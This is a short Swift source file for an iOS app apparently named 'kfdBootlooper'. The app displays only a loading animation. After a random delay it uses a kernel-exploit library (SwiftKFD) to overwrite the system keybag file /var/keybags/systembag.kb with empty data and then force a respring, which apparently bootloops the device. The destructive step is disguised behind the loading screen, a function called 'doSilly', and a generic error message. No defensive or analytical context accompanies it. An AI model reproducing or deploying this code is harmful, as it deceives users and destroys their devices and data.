//
//  ContentView.swift
//  kfdBootlooper
//
//  Created by Skadz on 5/1/24.
//

import SwiftUI
import SwiftKFD
import SwiftKFD_objc
import SwiftfulLoadingIndicators

struct ContentView: View {
    var body: some View {
        VStack {
            Spacer()
            LoadingIndicator(animation: .text, size: .extraLarge)
            Spacer()
        }
        .onAppear(perform: {
            Task {
                DispatchQueue.main.asyncAfter(deadline: .now() + Double.random(in: 0.3...1.8)) {
                    doSilly()
                }
            }
        })
    }
}

func doSilly() {
    do {
        try? SmartKopen()
        try overwriteFile(at: .init(string: "file:///var/keybags/systembag.kb")!, with: Data())
        SmartKclose()
        respring()
    } catch {
        UIApplication.shared.alert(body: "An unknown error occurred. Please re-open the app.")
        exitApp()
    }
}

#Preview {
    ContentView()
}
